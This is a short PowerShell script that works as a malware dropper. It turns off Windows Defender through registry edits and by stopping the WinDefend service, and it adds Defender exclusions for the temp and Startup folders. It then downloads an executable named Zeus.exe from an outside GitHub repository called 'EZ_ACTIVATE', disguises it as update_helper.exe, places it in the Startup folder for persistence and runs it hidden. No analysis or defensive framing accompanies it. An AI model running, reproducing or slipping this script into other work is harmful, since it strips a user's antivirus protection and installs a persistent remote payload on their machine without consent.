# Disable Windows Defender via registry
reg add "HKCU\Software\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f

# Stop Defender services
Get-WmiObject -Class Win32_Service -Filter "Name='WinDefend'" | ForEach-Object { $_.StopService() }

# Add exclusions for temp and startup folders
reg add "HKCU\Software\Microsoft\Windows Defender\Exclusions\Paths" /v "$env:TEMP" /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows Defender\Exclusions\Paths" /v "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" /t REG_DWORD /d "0" /f

# Download and install persistent program
$url = "https://github.com/QUADROisCoding/EZ_ACTIVATE/raw/main/Zeus.exe"
$tempFile = "$env:TEMP\update_helper.exe"
$startupFile = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update_helper.exe"

(New-Object Net.WebClient).DownloadFile($url, $tempFile)
Copy-Item -Path $tempFile -Destination $startupFile -Force
Start-Process -FilePath $startupFile -WindowStyle Hidden
